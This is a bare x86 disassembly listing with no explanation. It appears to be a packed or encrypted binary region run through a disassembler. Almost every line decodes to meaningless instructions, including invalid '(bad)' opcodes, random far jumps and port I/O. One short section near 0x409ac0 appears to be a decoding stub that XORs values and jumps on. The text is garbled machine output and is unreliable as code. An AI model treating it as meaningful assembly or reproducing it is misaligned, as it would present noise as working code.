  409695:	add    eax,0xcab27c54
  40969a:	push   0xffffff9a
  40969c:	dec    esi
  40969d:	fwait
  40969e:	mov    bl,0x8
  4096a0:	call   0xe06e69eb
  4096a5:	fmul   st(2),st
  4096a7:	xor    BYTE PTR [ebx],al
  4096a9:	ins    DWORD PTR es:[edi],dx
  4096aa:	(bad)
  4096ae:	repz fist DWORD PTR [esi-0x6cc4486a]
  4096b5:	daa    
  4096b6:	scas   al,BYTE PTR es:[edi]
  4096b7:	adc    DWORD PTR [ebx-0x52],ebp
  4096ba:	push   edi
  4096bb:	imul   edx,edi,0xb6d079b1
  4096c1:	iret   
  4096c2:	fcomip st,st(7)
  4096c4:	ins    DWORD PTR es:[edi],dx
  4096c5:	data16 fild DWORD PTR [ebx]
  4096c8:	pop    ss
  4096c9:	test   edx,ebp
  4096cb:	mov    dl,0xae
  4096cd:	fst    st(1)
  4096cf:	pop    ebp
  4096d0:	dec    ecx
  4096d1:	pop    DWORD PTR [edx]
  4096d3:	sti    
  4096d4:	or     al,0x24
  4096d6:	adc    edi,DWORD PTR [eax+0x4a794245]
  4096dc:	mov    ch,0xb1
  4096de:	lods   eax,DWORD PTR ds:[esi]
  4096df:	stc    
  4096e0:	inc    esi
  4096e1:	sar    ebx,0x97
  4096e4:	int    0x8d
  4096e6:	scas   al,BYTE PTR es:[edi]
  4096e7:	mov    al,0xdd
  4096e9:	outs   dx,DWORD PTR ds:[esi]
  4096ea:	mov    bl,ah
  4096ec:	adc    al,0xb3
  4096ee:	inc    esp
  4096ef:	and    ebx,DWORD PTR [ecx+0x9]
  4096f2:	sub    dl,dh
  4096f4:	(bad)  
  4096f5:	cmp    BYTE PTR [esi-0x26],ah
  4096f8:	addr16 inc esi
  4096fa:	push   0x5ed690f5
  4096ff:	and    dh,BYTE PTR [ebx+0x7b]
  409702:	lock push 0xf4b2563d
  409708:	nop
  409709:	mov    ds:0x4001828c,eax
  40970e:	dec    ebp
  40970f:	cmp    al,0x90
  409711:	in     eax,0x85
  409713:	out    dx,al
  409714:	sbb    ebp,eax
  409716:	dec    ecx
  409717:	mov    cl,0xe9
  409719:	sar    DWORD PTR [edx+eiz*1],cl
  40971c:	jmp    0xdc35:0x8aa2f42a
  409723:	xchg   edx,eax
  409724:	add    ch,al
  409726:	cwde   
  409727:	mov    esi,DWORD PTR [edx]
  409729:	pop    ebx
  40972a:	inc    esi
  40972b:	cli    
  40972c:	xchg   ebx,eax
  40972d:	scas   eax,DWORD PTR es:[edi]
  40972e:	div    bx
  409731:	retf   0x3c92
  409734:	jae    0x40971e
  409736:	aam    0xd6
  409738:	ret    
  409739:	cld    
  40973a:	xlat   BYTE PTR ds:[ebx]
  40973b:	sub    eax,0x88a6e77c
  409740:	pop    eax
  409741:	lods   al,BYTE PTR ds:[esi]
  409742:	(bad)  
  409743:	lock lods eax,DWORD PTR ds:[esi]
  409745:	lods   al,BYTE PTR ds:[esi]
  409746:	lahf   
  409747:	imul   eax,DWORD PTR [esi+0xe6cbf23],0xaf20954b
  409751:	dec    edi
  409752:	fdiv   st,st(7)
  409754:	hlt    
  409755:	xor    eax,0x9f502329
  40975a:	jbe    0x4097d7
  40975c:	cli    
  40975d:	mov    al,0x76
  40975f:	mov    ch,0x69
  409761:	mov    ds:0xef200548,eax
  409766:	cmp    esi,DWORD PTR [edi]
  409768:	in     al,dx
  409769:	jl     0x409713
  40976b:	loop   0x409748
  40976d:	cmp    BYTE PTR [eax+0x7004113d],cl
  409773:	pop    es
  409774:	(bad)  
  409775:	mov    ch,0x15
  409777:	adc    cl,BYTE PTR [ebx+0x67]
  40977a:	push   esi
  40977b:	adc    dh,BYTE PTR [ebp+0x39]
  40977e:	push   esi
  40977f:	or     BYTE PTR [edi+0x54],dh
  409782:	mov    es,edi
  409784:	inc    esp
  409785:	jne    0x409726
  409787:	lea    edx,[edx+0x37]
  40978a:	cld    
  40978b:	shl    esp,1
  40978d:	jmp    0xb1b6:0x1555d890
  409794:	mov    DWORD PTR [edi],edx
  409796:	mov    ebx,0x4bea39bf
  40979b:	test   DWORD PTR [ebx-0x46712a0c],ecx
  4097a1:	(bad)  
  4097a2:	jl     0x409800
  4097a4:	jne    0x40972b
  4097a6:	into   
  4097a7:	jl     0x409807
  4097a9:	mov    bh,0x57
  4097ab:	dec    edi
  4097ac:	popa   
  4097ad:	daa    
  4097ae:	fldenv [esp+ebp*8]
  4097b1:	lods   eax,DWORD PTR ds:[esi]
  4097b2:	and    eax,0xfca00142
  4097b7:	dec    eax
  4097b8:	mov    dh,0x99
  4097ba:	sub    eax,0x4d9e23af
  4097bf:	jns    0x4097f3
  4097c1:	jno    0x40978a
  4097c3:	xchg   ebp,eax
  4097c4:	mov    fs,WORD PTR [esi]
  4097c6:	mov    BYTE PTR [eax],cl
  4097c8:	and    BYTE PTR [edi-0x7e],cl
  4097cb:	jo     0x4097f2
  4097cd:	cs ds mov dl,0x57
  4097d1:	std    
  4097d2:	inc    esp
  4097d3:	pop    esp
  4097d4:	js     0x40977d
  4097d6:	mov    ecx,0x2e99a2cc
  4097db:	fmulp  st(1),st
  4097dd:	jmp    0x90e5:0xe6cbe379
  4097e4:	fcmovne st,st(1)
  4097e6:	ja     0x409845
  4097e8:	dec    edx
  4097e9:	fild   QWORD PTR [edx-0x6d246aa5]
  4097ef:	sahf   
  4097f0:	(bad)  
  4097f1:	das    
  4097f2:	jl     0x409872
  4097f4:	push   es
  4097f5:	jno    0x4097a7
  4097f7:	cdq    
  4097f8:	sub    esi,DWORD PTR [ebp+0xe]
  4097fb:	ret    
  4097fc:	xor    al,0x53
  4097fe:	push   es
  4097ff:	inc    esi
  409800:	mov    ebp,0x2161583b
  409805:	les    ecx,FWORD PTR [ecx*1+0x52b46b7e]
  40980c:	stos   DWORD PTR es:[edi],eax
  40980d:	mov    DWORD PTR [edi+0x5d],esi
  409810:	fdiv   st(5),st
  409812:	sbb    dl,dh
  409814:	dec    ebx
  409815:	push   ds
  409816:	jl     0x409879
  409818:	out    0x7,al
  40981a:	scas   al,BYTE PTR es:[edi]
  40981b:	cmp    esp,0xffffffc4
  40981e:	jb     0x4097c6
  409820:	xchg   DWORD PTR [edx+0x2321e40a],esi
  409826:	lods   eax,DWORD PTR ds:[esi]
  409827:	add    bl,BYTE PTR [edi-0x391ef838]
  40982d:	jl     0x4097f1
  40982f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409830:	push   edi
  409831:	mov    al,ds:0xa45ed0f6
  409836:	xor    eax,0xbb35b114
  40983b:	sub    al,0x3f
  40983d:	mov    ch,0x69
  40983f:	pop    ebp
  409840:	and    eax,0xecdfb222
  409845:	sub    cl,dl
  409847:	cmp    esi,0xe77eff29
  40984d:	push   esi
  40984e:	das    
  40984f:	mov    dl,0x35
  409851:	test   BYTE PTR [ecx-0x5a5e960a],bl
  409857:	je     0x4098a5
  409859:	test   BYTE PTR [ecx],ch
  40985b:	sbb    eax,ecx
  40985d:	out    0x0,eax
  40985f:	push   eax
  409860:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  409862:	cdq    
  409863:	pushf  
  409864:	mov    WORD PTR [ebp+0x4],fs
  409867:	dec    edi
  409868:	jmp    0x4097fd
  40986a:	and    eax,0x7169c097
  40986f:	jmp    0x761a:0xe4e66c15
  409876:	stc    
  409877:	sbb    ah,ch
  409879:	push   0xf46f26a
  40987e:	call   0xb308:0xbdc56c4
  409885:	push   ebx
  409886:	sub    al,0xf8
  409888:	mov    bh,0x7d
  40988a:	shr    edx,1
  40988c:	inc    edx
  40988d:	fbstp  TBYTE PTR [ebx+0x2d109eb9]
  409893:	call   0x9a2b:0x246daf78
  40989a:	mov    ds:0x8606da59,al
  40989f:	sub    al,0xfc
  4098a1:	in     eax,0x3d
  4098a3:	mov    dh,0xc3
  4098a5:	adc    al,0x7c
  4098a7:	pop    ebx
  4098a8:	test   al,0xe8
  4098aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ab:	daa    
  4098ac:	dec    edi
  4098ad:	xchg   ebp,eax
  4098ae:	or     esp,DWORD PTR [edi]
  4098b0:	or     cl,BYTE PTR [ecx]
  4098b2:	cmp    DWORD PTR [edi+edx*8],0xd963853f
  4098b9:	sub    al,0x89
  4098bb:	es scas al,BYTE PTR es:[edi]
  4098bd:	push   esi
  4098be:	mov    eax,ds:0xed72b23c
  4098c3:	sbb    al,0x2e
  4098c5:	ror    bl,cl
  4098c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098c8:	sub    BYTE PTR [edx-0x38],ch
  4098cb:	and    BYTE PTR [edi+0x21168cc6],cl
  4098d1:	xor    DWORD PTR [edi],esi
  4098d3:	or     ah,cl
  4098d5:	test   BYTE PTR [ebp+0x1c2d703f],0x79
  4098dc:	cmp    ah,BYTE PTR [edi+0xaa790aa]
  4098e2:	sub    al,0xbf
  4098e4:	sub    dh,BYTE PTR [eax]
  4098e6:	aam    0x79
  4098e8:	dec    edi
  4098e9:	addr16 pop edx
  4098eb:	faddp  st(5),st
  4098ed:	jge    0x40993f
  4098ef:	dec    ebx
  4098f0:	(bad)  
  4098f1:	mov    ebp,0x737697e
  4098f6:	inc    esp
  4098f7:	cmp    cl,BYTE PTR [ebx+0x2a5c1fda]
  4098fd:	inc    ecx
  4098fe:	sbb    DWORD PTR [edx+eax*2],esp
  409901:	inc    esp
  409902:	fs sub eax,0xc35aaf20
  409908:	and    al,cl
  40990a:	sub    eax,DWORD PTR [eax-0x28]
  40990d:	or     eax,DWORD PTR [edx-0x37]
  409910:	adc    eax,0x95ea119
  409915:	dec    esi
  409916:	lods   eax,DWORD PTR ds:[esi]
  409917:	or     ebx,ebx
  409919:	push   esp
  40991a:	dec    ecx
  40991b:	mov    al,ds:0x106e4352
  409920:	arpl   ax,bx
  409922:	(bad)  
  409924:	or     al,0x29
  409926:	daa    
  409927:	mov    ds:0xdd9b32e3,eax
  40992c:	out    dx,al
  40992d:	ret    
  40992e:	inc    ecx
  40992f:	and    ch,ch
  409931:	repz sti 
  409933:	and    dh,BYTE PTR [ecx-0x33d28d5a]
  409939:	pop    esp
  40993a:	mov    BYTE PTR [edi+0x26],dh
  40993d:	inc    BYTE PTR [esi-0x74]
  409940:	es sub bl,ch
  409943:	add    ebp,DWORD PTR [ecx-0x5d]
  409946:	add    ebp,ecx
  409948:	or     DWORD PTR [ebx-0x278ca6c3],edx
  40994e:	push   es
  40994f:	ss xchg edx,eax
  409951:	(bad)  
  409952:	ret    0xd6
  409955:	(bad)  
  409956:	fbld   TBYTE PTR ds:0x6c181b
  40995c:	call   0xa8c173a2
  409961:	es pop ecx
  409963:	jne    0x40992f
  409965:	test   ebp,esp
  409967:	push   es
  409968:	xchg   edx,eax
  409969:	pusha  
  40996a:	loopne 0x4098f8
  40996c:	aam    0x9d
  40996e:	(bad)  
  40996f:	fnstsw ax
  409971:	jnp    0x4099b5
  409973:	ins    BYTE PTR es:[edi],dx
  409974:	xchg   DWORD PTR [ebx],edi
  409976:	pop    ebx
  409977:	xor    edi,eax
  409979:	xor    eax,0xba8cdc9d
  40997e:	sbb    al,0x65
  409980:	and    al,0xa7
  409982:	xor    dl,BYTE PTR [edi-0x3259f8a]
  409988:	lahf   
  409989:	stc    
  40998a:	add    bh,ah
  40998c:	cmp    ebx,DWORD PTR [esi-0x96410a7]
  409992:	sbb    BYTE PTR [edi-0x335c4386],bh
  409998:	es leave 
  40999a:	das    
  40999b:	shl    al,cl
  40999d:	pushf  
  40999e:	inc    ecx
  4099a0:	aas    
  4099a1:	pop    ds
  4099a2:	mov    BYTE PTR [esp],dh
  4099a5:	jbe    0x4099ac
  4099a7:	mov    eax,ds:0x6e3165d0
  4099ac:	ins    BYTE PTR es:[edi],dx
  4099ad:	ins    BYTE PTR es:[edi],dx
  4099ae:	and    al,0x5a
  4099b0:	fcomp  DWORD PTR [edi+0x1b]
  4099b3:	lahf   
  4099b4:	pop    ss
  4099b5:	adc    ecx,DWORD PTR [ebx]
  4099b7:	push   es
  4099b8:	jmp    0x409997
  4099ba:	xor    al,0xda
  4099bc:	jae    0x4099db
  4099be:	stos   DWORD PTR es:[edi],eax
  4099bf:	int    0x3b
  4099c1:	xlat   BYTE PTR ds:[ebx]
  4099c2:	(bad)  
  4099c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c4:	xor    bh,bl
  4099c6:	mov    al,ds:0xe34f8f61
  4099cb:	inc    ebx
  4099cc:	loopne 0x4099a8
  4099ce:	lods   eax,DWORD PTR ds:[esi]
  4099cf:	jns    0x409999
  4099d1:	aam    0x99
  4099d3:	ror    DWORD PTR [eax+0x7f],cl
  4099d6:	dec    edx
  4099d7:	mov    edi,0x11c11356
  4099dc:	cmp    BYTE PTR [edi],ah
  4099de:	lods   eax,DWORD PTR ds:[esi]
  4099df:	or     al,0x6b
  4099e1:	pusha  
  4099e2:	inc    esi
  4099e3:	call   DWORD PTR [ebx]
  4099e5:	pop    ecx
  4099e6:	jecxz  0x409a51
  4099e8:	or     eax,0xb8549655
  4099ed:	jo     0x409a5a
  4099ef:	xchg   esp,eax
  4099f0:	sbb    esi,DWORD PTR [ecx]
  4099f2:	push   ebx
  4099f3:	add    BYTE PTR [edi+0x25],dh
  4099f6:	sub    BYTE PTR [edi],ah
  4099f8:	cmp    edi,edi
  4099fa:	adc    DWORD PTR [ebp+0x2c986336],esi
  409a00:	(bad)  
  409a01:	(bad)  [esi-0x21]
  409a04:	mov    esi,0x524b7dc7
  409a09:	inc    esi
  409a0a:	inc    edi
  409a0b:	retf   0x67fd
  409a0e:	stos   BYTE PTR es:[edi],al
  409a0f:	mov    WORD PTR [edi],cs
  409a11:	ins    DWORD PTR es:[edi],dx
  409a12:	jle    0x409a92
  409a14:	in     al,0x5f
  409a16:	popa   
  409a17:	sbb    BYTE PTR [esi],0x91
  409a1a:	dec    esp
  409a1b:	int3   
  409a1c:	xchg   edi,ebx
  409a1e:	jbe    0x4099ea
  409a20:	sub    cl,BYTE PTR [ebp+0x3]
  409a23:	pop    ss
  409a24:	xchg   edx,eax
  409a25:	(bad)  
  409a26:	in     al,0xca
  409a28:	dec    esp
  409a29:	push   ebp
  409a2a:	xlat   BYTE PTR ds:[ebx]
  409a2b:	in     al,dx
  409a2c:	(bad)  
  409a2d:	dec    ecx
  409a2e:	rol    BYTE PTR [esi],cl
  409a30:	push   ebx
  409a31:	bound  ecx,QWORD PTR [eax-0x7c]
  409a34:	jmp    0xb12e:0x64c1c1dd
  409a3b:	mov    bl,0x46
  409a3d:	jg     0x409a99
  409a3f:	mov    di,0x369a
  409a43:	push   ss
  409a44:	xchg   esi,esi
  409a46:	(bad)  
  409a48:	xchg   esp,eax
  409a49:	push   eax
  409a4a:	out    dx,al
  409a4b:	dec    edi
  409a4c:	inc    ebx
  409a4d:	enter  0xa258,0x90
  409a51:	mov    esi,DWORD PTR [ebx]
  409a53:	xchg   ebp,eax
  409a54:	dec    edi
  409a55:	retf   0xf5e7
  409a58:	mov    dl,0x51
  409a5a:	sub    DWORD PTR [edx+0x7f],ebp
  409a5d:	adc    ch,BYTE PTR [edi-0x47a99725]
  409a63:	jb     0x409a09
  409a65:	stos   BYTE PTR es:[edi],al
  409a66:	in     al,dx
  409a67:	bound  esp,QWORD PTR [edi+edi*8+0x65]
  409a6b:	shr    DWORD PTR ds:0x238272d6,cl
  409a71:	add    esp,eax
  409a73:	jo     0x409a94
  409a75:	icebp  
  409a76:	fs push ebx
  409a78:	ret    
  409a79:	in     al,dx
  409a7a:	mov    eax,0x935508c0
  409a7f:	lods   al,BYTE PTR ds:[esi]
  409a80:	loopne 0x409aca
  409a82:	ret    0x7a4d
  409a85:	fcomp  DWORD PTR ds:0x4c356dce
  409a8b:	fnstcw WORD PTR ds:[edi+edi*1+0x56]
  409a90:	in     al,dx
  409a91:	test   BYTE PTR [edx-0x4c],bh
  409a94:	push   cs
  409a95:	xor    ah,BYTE PTR [ecx-0x7bd368f8]
  409a9b:	cli    
  409a9c:	popa   
  409a9d:	enter  0x3491,0x5a
  409aa1:	mov    bl,0xc5
  409aa3:	and    DWORD PTR [edx+eiz*1-0x3f17383c],ecx
  409aaa:	dec    ecx
  409aab:	or     al,0x4
  409aad:	bound  esp,QWORD PTR [eax-0x109090e9]
  409ab3:	lods   al,BYTE PTR ds:[esi]
  409ab4:	mov    eax,cs
  409ab6:	add    DWORD PTR [eax+0x80d8b56],0x20
  409abd:	inc    edx
  409abe:	add    BYTE PTR [ebx],al
  409ac0:	or     eax,0x420e82
  409ac5:	mov    DWORD PTR ds:0x422008,ecx
  409acb:	mov    esi,0xf89c85b5
  409ad0:	mov    DWORD PTR [ebp-0xc],esi
  409ad3:	mov    edx,DWORD PTR ds:0x420f34
  409ad9:	mov    ecx,DWORD PTR ds:0x42301c
  409adf:	sub    ecx,edx
  409ae1:	sub    edx,DWORD PTR [edx+ecx*1]
  409ae4:	lea    eax,[ebp-0xc]
  409ae7:	or     ecx,edx
  409ae9:	mov    DWORD PTR [ebp-0x14],eax
  409aec:	mov    eax,DWORD PTR [ebp-0xc]
  409aef:	mov    edx,DWORD PTR [ebp-0x14]
  409af2:	sbb    DWORD PTR ds:0x420fa0,ebx
  409af8:	mov    ecx,0x7510896
  409afd:	xor    eax,ecx
  409aff:	add    eax,0x3272dd
  409b04:	mov    DWORD PTR [edx],eax
  409b06:	mov    edx,DWORD PTR ds:0x42201c
  409b0c:	sbb    DWORD PTR ds:0x420ef0,edx
  409b12:	mov    eax,ds:0x4242ad
  409b17:	mov    edx,DWORD PTR [ebp-0x4]
  409b1a:	sbb    DWORD PTR ds:0x420fac,0x420e82
  409b24:	mov    eax,DWORD PTR [eax]
  409b26:	or     DWORD PTR ds:0x420f08,0x422000
  409b30:	add    eax,DWORD PTR [edx]
  409b32:	push   edi
  409b33:	mov    DWORD PTR [ebp-0x8],eax
  409b36:	jmp    0x40beb0
  409b3b:	popa   
  409b3c:	dec    edi
  409b3d:	jmp    0x409b64
  409b3f:	mov    ebx,0xf1fba379
  409b44:	jnp    0x409bbc
  409b46:	js     0x409b4f
  409b48:	cmc    
  409b49:	aad    0x72
  409b4b:	cmp    DWORD PTR [edx+edi*2],eax
  409b4e:	jp     0x409b69
  409b50:	pop    edi
  409b51:	jp     0x409bcd
  409b53:	bound  esp,QWORD PTR [edi]
  409b55:	ins    BYTE PTR es:[edi],dx
  409b56:	mov    eax,ds:0x9448ef8b
  409b5b:	dec    esp
  409b5d:	pop    eax
  409b5e:	and    ebp,eax
  409b60:	push   edx
  409b61:	mov    WORD PTR [eax],?
  409b63:	test   BYTE PTR [esi+eiz*4],cl
  409b66:	dec    edx
  409b67:	mov    al,ds:0x178ef3e6
  409b6c:	ret    0x29d4
  409b6f:	inc    eax
  409b70:	jae    0x409be9
  409b72:	sub    al,0x16
  409b74:	sbb    esi,DWORD PTR [edi]
  409b76:	dec    ebx
  409b77:	sbb    al,0xc6
  409b79:	xchg   edi,eax
  409b7a:	and    bh,dl
  409b7c:	ret    0x64d6
  409b7f:	mov    es,WORD PTR [ebp-0x1c]
  409b82:	(bad)  
  409b84:	mov    BYTE PTR [ebx+0x3b0c9665],bh
  409b8a:	call   0x8c0:0x25fe5ad0
  409b91:	cmp    DWORD PTR [eax],ecx
  409b93:	and    DWORD PTR [bx+si],0xaa665274
  409b9a:	xor    al,ch
  409b9c:	cli    
  409b9d:	int3   
  409b9e:	out    0xdd,eax
  409ba0:	sbb    eax,0xf668264e
  409ba5:	jae    0x409c00
  409ba7:	repz ja 0x409b51
  409baa:	call   0x97bbf476
  409baf:	imul   DWORD PTR [edi]
  409bb1:	lods   eax,DWORD PTR ds:[esi]
  409bb2:	fsub   QWORD PTR [ecx-0x39]
  409bb5:	clc    
  409bb6:	jge    0x409b50
  409bb8:	dec    ebp
  409bb9:	mov    ds:0xaf253a59,al
  409bbe:	(bad)  
  409bbf:	sbb    eax,DWORD PTR [edx]
  409bc1:	mov    ebp,0xd6f6e2ec
  409bc6:	push   edx
  409bc7:	retf   
  409bc8:	and    al,0x10
  409bca:	sbb    al,0x92
  409bcc:	or     BYTE PTR [ecx-0x1d92610a],dl
  409bd2:	stc    
  409bd3:	aad    0xb4
  409bd5:	pop    ebp
  409bd6:	bound  edx,QWORD PTR [edx+esi*8+0x40]
  409bda:	and    eax,0xbbf920de
  409bdf:	js     0x409b85
  409be1:	sti    
  409be2:	adc    cl,dl
  409be4:	mov    dl,0xc2
  409be6:	xchg   DWORD PTR [eax],ebx
  409be8:	mov    dl,dl
  409bea:	or     eax,0x1616963e
  409bef:	mov    ecx,0x21455647
  409bf4:	push   esi
  409bf5:	js     0x409b83
  409bf7:	dec    esi
  409bf8:	or     eax,0xd372d28
  409bfd:	xchg   ebx,eax
  409bfe:	fisub  DWORD PTR [edi]
  409c00:	cmp    BYTE PTR [ebp+0x353b19ce],ah
  409c06:	add    al,0x43
  409c08:	mov    ah,0xc7
  409c0a:	jle    0x409c8b
  409c0c:	nop
  409c0d:	cmp    al,0x90
  409c0f:	xor    esp,DWORD PTR [edx+edx*2-0x7211e746]
  409c16:	mov    ds:0xb216b89b,al
  409c1b:	pop    ebx
  409c1c:	fwait
  409c1d:	lods   eax,DWORD PTR ds:[esi]
  409c1e:	mov    BYTE PTR [eax-0x1c],ah
  409c21:	(bad)  
  409c22:	dec    edx
  409c23:	cli    
  409c24:	popa   
  409c25:	xor    al,ah
  409c27:	ds pop esi
  409c29:	inc    eax
  409c2a:	je     0x409bd4
  409c2c:	sub    eax,DWORD PTR [ebx+esi*2]
  409c2f:	daa    
  409c30:	rol    DWORD PTR [edx-0x3e],cl
  409c33:	or     DWORD PTR [edi],edx
  409c35:	call   0x643e7b1d
  409c3a:	cmove  ecx,esp
  409c3d:	(bad)  
  409c3f:	aad    0xc5
  409c41:	scas   al,BYTE PTR es:[edi]
  409c42:	pop    esi
  409c43:	aam    0x38
  409c45:	mov    eax,0xd8bef213
  409c4a:	pop    edi
  409c4b:	mov    cl,BYTE PTR [ebp-0x50]
  409c4e:	cld    
  409c4f:	cmp    esi,DWORD PTR [ebx+0x3ef8f858]
  409c55:	sub    al,0x84
  409c57:	push   esi
  409c58:	sub    eax,0x42da9f2
  409c5d:	or     al,0x4e
  409c5f:	call   0x7352:0x334fd57d
  409c66:	ins    BYTE PTR es:[edi],dx
  409c67:	mov    edi,0x1efe4998
  409c6c:	repz cdq 
  409c6e:	and    al,0xed
  409c70:	sbb    BYTE PTR [eax+ebx*2],bh
  409c73:	sbb    BYTE PTR [bx-0x6e],al
  409c77:	aad    0xeb
  409c79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c7a:	lea    edx,[ecx]
  409c7c:	retf   
  409c7d:	ins    DWORD PTR es:[edi],dx
  409c7e:	jg     0x409c8f
  409c80:	push   cs
  409c81:	mov    bl,0xa7
  409c83:	jmp    0x409c9b
  409c85:	and    esi,esp
  409c87:	test   al,0xe0
  409c89:	shr    esi,1
  409c8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c8c:	or     DWORD PTR [edi],ebp
  409c8e:	jbe    0x409c88
  409c90:	add    ebp,DWORD PTR [ebx-0x24cc2a5b]
  409c96:	jmp    0x9cc6af7d
  409c9b:	daa    
  409c9c:	imul   esp,edi,0x24d57520
  409ca2:	mov    edx,0xed3c6ad2
  409ca7:	add    ecx,ebp
  409ca9:	lock fisub WORD PTR [ebx]
  409cac:	pop    ecx
  409cad:	mov    ebx,0xe35daebb
  409cb2:	cmovnp eax,DWORD PTR [ecx]
  409cb5:	dec    edx
  409cb6:	inc    DWORD PTR [edi+ebp*2+0x66fd99e3]
  409cbd:	jno    0x409d0c
  409cbf:	pop    ecx
  409cc0:	adc    DWORD PTR [ebx-0x7f],0xffffffe2
  409cc4:	sub    eax,0xd9158d75
  409cc9:	mov    DWORD PTR [ebx],esp
  409ccb:	clc    
  409ccc:	and    BYTE PTR [edi+0x3f],bl
  409ccf:	adc    DWORD PTR [ebx],ecx
  409cd1:	loopne 0x409c6e
  409cd3:	xor    bl,bl
  409cd5:	pusha  
  409cd6:	pop    edx
  409cd7:	xchg   DWORD PTR [ecx+edi*8-0x1a297956],esp
  409cde:	mov    al,ds:0xa443483c
  409ce3:	rol    BYTE PTR [ebp-0x22],cl
  409ce6:	jne    0x409d4a
  409ce8:	retf   
  409ce9:	(bad)  
  409cea:	push   ebx
  409ceb:	fnstsw WORD PTR [esi]
  409ced:	inc    edi
  409cee:	stos   DWORD PTR es:[edi],eax
  409cef:	pop    esi
  409cf0:	cmp    ch,al
  409cf2:	stos   DWORD PTR es:[edi],eax
  409cf3:	xor    eax,0x9494d855
  409cf8:	lods   al,BYTE PTR ds:[esi]
  409cf9:	int3   
  409cfa:	lds    edx,FWORD PTR [ecx+edi*8+0x6d]
  409cfe:	adc    ah,BYTE PTR [ebx-0x28]
  409d01:	mov    al,ds:0xe56bfec1
  409d06:	ffree  st(7)
  409d08:	fwait
  409d09:	jns    0x409c9b
  409d0b:	pop    ecx
  409d0c:	sbb    eax,0xb8ef8c79
  409d11:	loope  0x409cce
  409d13:	adc    al,0x3a
  409d15:	sub    eax,0x465ddf83
  409d1a:	lods   eax,DWORD PTR ds:[esi]
  409d1b:	imul   eax,DWORD PTR [edi+0x58],0x198045a2
  409d22:	test   al,0x5b
  409d24:	pop    ebp
  409d25:	clc    
  409d26:	sbb    al,0xc1
  409d28:	push   ds
  409d29:	in     eax,dx
  409d2a:	fnstenv [edi]
  409d2c:	mov    cs,ebx
  409d2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d2f:	cmp    bl,ah
  409d31:	jp     0x409d29
  409d33:	cmp    dh,BYTE PTR [ecx+0x18]
  409d36:	ins    DWORD PTR es:[edi],dx
  409d37:	repz xchg ebx,eax
  409d39:	or     edx,ecx
  409d3b:	jecxz  0x409d46
  409d3d:	sub    ecx,DWORD PTR [ecx]
  409d3f:	jbe    0x409dad
  409d41:	mov    ds:0x47ddf33d,eax
  409d46:	push   ss
  409d47:	adc    al,0xd5
  409d4a:	xchg   ebp,eax
  409d4b:	fisttp WORD PTR [edi+0x5]
  409d4e:	shl    ah,1
  409d50:	or     al,BYTE PTR [ecx+0x53]
  409d53:	mov    ds:0xb2f0129,al
  409d58:	dec    bh
  409d5a:	jbe    0x409d2a
  409d5c:	cld    
  409d5d:	(bad)  [ebp-0x7c]
  409d60:	popa   
  409d61:	std    
  409d62:	jecxz  0x409db7
  409d64:	scas   eax,DWORD PTR es:[edi]
  409d65:	cmc    
  409d66:	cmc    
  409d67:	mov    ah,0x83
  409d69:	push   esi
  409d6a:	dec    edi
  409d6b:	test   eax,0xbbf1a775
  409d70:	and    edx,DWORD PTR [esi+0x5a]
  409d73:	dec    edx
  409d74:	hlt    
  409d75:	(bad)  
  409d76:	jmp    0xf904:0x6bc6c7df
  409d7d:	nop
  409d7e:	mov    edi,0x4f9d9a21
  409d83:	stos   BYTE PTR es:[edi],al
  409d84:	sbb    ebx,DWORD PTR [edi]
  409d86:	ja     0x409d5c
  409d88:	pop    esp
  409d89:	mov    ah,0x28
  409d8b:	out    0x43,eax
  409d8d:	jae    0x409d1d
  409d8f:	push   cx
  409d91:	jno    0x409d38
  409d93:	mov    cs,WORD PTR [eax-0x16e5e746]
  409d99:	in     al,dx
  409d9a:	jns    0x409df2
  409d9c:	jo     0x409e0a
  409d9e:	push   0x7d25b698
  409da3:	adc    ah,BYTE PTR [ecx-0x4c]
  409da6:	fcomp  QWORD PTR [edi-0x4e]
  409da9:	repnz aad 0x67
  409dac:	mov    ds:0x49740070,eax
  409db1:	jmp    0x3eccf464
  409db6:	sub    ch,BYTE PTR [ebx+0xeef617d]
  409dbc:	sub    al,0xa
  409dbe:	and    al,0xf8
  409dc0:	xchg   ebp,eax
  409dc1:	(bad)  
  409dc2:	jno    0x409e20
  409dc4:	out    0xab,al
  409dc6:	addr16 pop eax
  409dc8:	pop    esi
  409dc9:	push   cs
  409dca:	push   edx
  409dcb:	clc    
  409dcc:	push   eax
  409dcd:	repnz mov al,ds:0x9ad4b994
  409dd3:	mov    ebx,0xd35f67e2
  409dd8:	mov    WORD PTR [ecx+0x23],?
  409ddb:	es xchg ecx,eax
  409ddd:	frstor ds:0xafbf5ecd
  409de3:	push   ds
  409de4:	ficomp DWORD PTR [ecx+0x5]
  409de7:	jg     0x409e19
  409de9:	xor    ah,BYTE PTR [ebp-0x5]
  409dec:	stc    
  409ded:	dec    esp
  409dee:	enter  0x36c,0x69
  409df2:	xor    eax,0x17f17edd
  409df7:	cmp    DWORD PTR [esi],0xfffffffa
  409dfa:	xchg   ebx,esp
  409dfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dfd:	aas    
  409dfe:	push   ebp
  409dff:	add    BYTE PTR [eax+0x657b83c7],ch
  409e05:	xchg   ebp,eax
  409e06:	inc    esp
  409e07:	push   esp
  409e08:	mov    eax,esi
  409e0a:	pop    eax
  409e0b:	xor    BYTE PTR [ebx+0x20],ch
  409e0e:	lods   eax,DWORD PTR ds:[esi]
  409e0f:	push   0xb
  409e11:	fcomp  DWORD PTR [ecx-0x336e4430]
  409e17:	cwde   
  409e18:	psubb  mm7,QWORD PTR [ebp-0x618fabec]
  409e1f:	adc    al,0xab
  409e21:	test   BYTE PTR [ebx+ebp*4+0x23],bl
  409e25:	int3   
  409e26:	adc    DWORD PTR [esi+ebp*1-0x37834fe9],edi
  409e2d:	dec    edi
  409e2e:	inc    edi
  409e2f:	arpl   WORD PTR [ebp+ebp*8-0x3b],di
  409e33:	clc    
  409e34:	shr    DWORD PTR [eax-0x41f87741],1
  409e3a:	push   0x3f4590ad
